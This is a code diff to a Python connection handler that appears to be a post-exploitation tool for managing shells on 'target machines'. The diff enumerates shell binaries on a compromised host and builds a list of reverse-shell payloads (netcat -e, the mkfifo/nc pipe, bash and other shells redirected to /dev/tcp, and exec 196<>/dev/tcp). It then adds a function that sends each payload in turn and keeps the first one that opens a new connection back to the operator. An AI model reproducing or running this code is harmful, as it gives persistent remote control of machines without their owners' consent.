@@ -14,9 +14,11 @@ s = None
 
 new_rev = {}
 
+num_cons = 0
+unique_addresses = []
 
 class connection:
-    def __init__(self, conn):
+    def __init__(self, conn, first=False):
         self.conn = conn[0]
         self.addr = conn[1][0]
         self.port = conn[1][1]
@@ -26,11 +28,13 @@ class connection:
         self.connected = False
         self.record = True
         self.recorded = ""
-        self.rev = ""
+        self.rev = []
+        self.working_rev = ""
         self.cmd = False
-        global PORT, IP, new_rev
-        if self.addr not in new_rev:
-            self.set_rev()
+        self.first = first
+        if self.first:
+            print("FIRST")
+            threading.Thread(target=self.set_rev).start()
 
 
     def rcv_stream(self):
@@ -50,56 +54,67 @@ class connection:
         self.cmd = False
         return self.recorded
 
+
+    def test_revs(self):
+        global num_cons
+        for rev in self.rev:
+            num = num_cons
+            self.conn.send(rev.encode())
+            time.sleep(2)
+            if num_cons > num:
+                self.working_rev = rev
+                print("REV = " + rev)
+                return
+        print("NO REVS FOUND")
+            
+
+
+
     def set_rev(self):
         global new_rev
         self.send_rcv("find /bin/ /usr/bin/")
 
-        if "sh" in self.recorded:
-            self.rev = f"sh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+        bins = self.recorded.split("\n")
+        #print(bins)
+        shells = ["sh","bsh","csh","bash","ksh","zsh","pdksh","tcsh","mksh","dash"]
+        
 
-        if "ash" in self.recorded:
-            self.rev = f"ash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
-        if "csh" in self.recorded:
-            self.rev = f"csh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+        if "/usr/bin/nc" in bins:
+            self.rev.append(f"nc {IP} {PORT} -e /usr/bin/bash & \r")
+            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f")
+            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1| /usr/bin/nc {IP} {PORT} >/tmp/f")
+            self.rev.append(f"/usr/bin/nc {IP} {PORT} -e /usr/bin/bash & \r")
 
-        if "bsh" in self.recorded:
-            self.rev = f"bsh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+        if "/bin/nc" in bins:
+            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f")
+            self.rev.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|/bin/nc {IP} {PORT} >/tmp/f")
+            self.rev.append(f"nc {IP} {PORT} -e /usr/bin/bash & \r")
+            self.rev.append(f"/bin/nc {IP} {PORT} -e /usr/bin/bash & \r")
 
-        if "ksh" in self.recorded:
-            self.rev = f"ksh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
+        for shell in shells:
+            sh = f"/bin/{shell}"
+            if sh in bins:
+                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r")
+                self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196 & \r")
+            sh = f"/usr/bin/{shell}"
+            if sh in bins:
+                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r")
+                self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196 & \r")
 
-        if "zsh" in self.recorded:
-            self.rev = f"zsh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
 
-        if "pdksh" in self.recorded:
-            self.rev = f"pdksh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
-
-        if "tcsh" in self.recorded:
-            self.rev = f"tcsh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
-
-        if "mksh" in self.recorded:
-            self.rev = f"mksh -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
-
-        if "dash" in self.recorded:
-            self.rev = f"dash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r"
-
-        if "/bin/nc" in self.recorded:
-            self.rev = f"nc {IP} {PORT} -e /bin/bash & \r"
-
-        print(self.rev)
-        new_rev[self.addr] = self.rev
+        self.test_revs()
+        global unique_addresses
+        print(f"{len(unique_addresses)}:\t{self.addr}")
+        #new_rev[self.addr] = self.rev
         self.record = False
 
 
     def create_new(self):
-        
-        global PORT, IP, new_rev
-        if self.addr not in new_rev:
-            self.set_rev()
-        self.conn.send(self.rev.encode())
+        self.conn.send(self.working_rev.encode())
 
     def connect(self, sock):
+
         self.sock = sock[0]
         self.connected = True
         threading.Thread(target=self.in_stream).start()
@@ -157,11 +172,10 @@ def run_t(ip):
 
 
 def run(quiet_mode=False):
-    global s, IP
+    global s, IP, num_cons, unique_addresses
     connections = []
     managed_connections = []
     addresses = {}
-    unique_addresses = []
     waitingl = []
     waitingd = {}
     global latest
@@ -192,12 +206,16 @@ def run(quiet_mode=False):
                 waitingl.append([ip, connections[-1]])
 
             else:                                       # connection from target machine
+                num_cons += 1
                 #pdb.set_trace()
                 if IP == "":
                     IP = connections[-1][0].getsockname()[0]
-                managed_connections.append(connection(connections[-1]))
-                
                 latest = connections[-1][1][0]
+                if not latest in addresses:
+                    managed_connections.append(connection(connections[-1], True))
+                else:
+                    managed_connections.append(connection(connections[-1]))
+                
 
                 if not latest in addresses:             # if unique address
                     id = len(unique_addresses)
@@ -206,7 +224,6 @@ def run(quiet_mode=False):
                         os.mkdir(d)
                     except:
                         pass
-                    print(f"{id}:\t{latest}")
                     addresses[latest] = managed_connections[-1]
                     unique_addresses.append(latest)
                     if not quiet_mode:
